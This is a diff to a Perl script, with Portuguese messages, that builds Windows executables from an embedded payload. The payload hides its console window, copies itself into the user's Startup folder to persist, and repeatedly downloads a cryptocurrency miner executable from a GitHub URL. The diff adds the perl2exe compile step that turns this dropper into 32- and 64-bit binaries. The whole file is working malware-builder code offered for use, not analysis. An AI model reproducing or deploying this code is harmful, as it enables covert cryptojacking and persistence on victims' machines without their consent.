@@ -1,8 +1,9 @@
 #!/usr/bin/perl -w
-use Term::ANSIColor;
+use Term::ANSIColor qw[color];
 use Archive::Zip;
 use LWP::Simple qw[getstore];
 use Config;
+use Cwd;
 
 if($Config{osname} =~ m/win/i){
   system("cls");
@@ -38,10 +39,7 @@ if(@ARGV){
     exit 0;
   }
   foreach(@ARGV){
-    if($_ =~ m/(.*?)\.(.*?)/){
-      &generate($_);
-    }
-    elsif($_ =~ m/--install-compiler/){
+    if($_ =~ m/--install-compiler/){
       unless($< == 0){
         print "Voce precisar executar esse programa como administrador !\n";
         exit 0;
@@ -57,6 +55,9 @@ if(@ARGV){
       system("move perl2exe /");
       print "\n[", color("YELLOW"),"!",color("reset"), "] Sucesso !\n";
       exit 0;
+    }
+    elsif($_ =~ m/(\w)\.(\w)/){
+      generate($_);
     }
     else{
       print "\n[", color("YELLOW"),"!",color("reset"), "] Parametro invalido!\n";
@@ -84,6 +85,7 @@ hide_console;
 #perl2exe_include Win32::HideConsole
 #perl2exe_include LWP::UserAgent
 #perl2exe_include LWP::Simple
+#perl2exe_include Config
 
 my (\$response, \$ua) = undef;
 \$ua = LWP::UserAgent->new;
@@ -92,7 +94,7 @@ while(1){
   if(`dir %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup` !~ m/\$0/g){
     system(\"copy \$0 %AppData%\\\\Microsoft\\\\Windows\\\\\\"Start Menu\\"\\\\Programs\\\\Startup\");
   }
-  until(`dir %AppData%` =~ m/^Ns(.*?)\.exe$/){
+  until(`dir %AppData%` =~ m/^Ns(.*?)\\.exe\$/){
     if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
       getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
     }else{
@@ -112,4 +114,35 @@ while(1){
 ";
 EXE
   close(OUTPUT);
+  my $unit = getcwd;
+  if($unit =~ m/(\w)\:\/(\w)/){$unit = $1;}
+  if($^V =~ m/5.24.1/){
+    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.1 -o output_32.exe output.pl");  
+    if(-e "output_32.exe"){
+      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
+    }else{
+      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
+    }
+    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.1 -o output_64.exe output.pl");
+    if(-e "output_64.exe"){
+      print "\nExecutavel de 64 bits gerado com sucesso !\n";
+    }else{
+      print "\nExecutavel de 64 bits nao foi gerado !\n";
+    }
+  }
+  if($^V =~ m/5.24.0/){
+    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win32-5.24.0 -o output_32.exe output.pl");
+    if(-e "output_32.exe"){
+      print "\nExecutavel de 32 bits gerado com sucesso !\n\n";
+    }else{
+      print "\nExecutavel de 32 bits nao foi gerado !\n\n";
+    }
+    system("$unit:\\perl2exe\\perl2exe.exe -platform=Win64-5.24.0 -o output_64.exe output.pl");
+    if(-e "output_64.exe"){
+      print "\nExecutavel de 64 bits gerado com sucesso !\n";
+    }else{
+      print "\nExecutavel de 64 bits nao foi gerado !\n";
+    }
+  }
+  unlink "output.pl";
 }
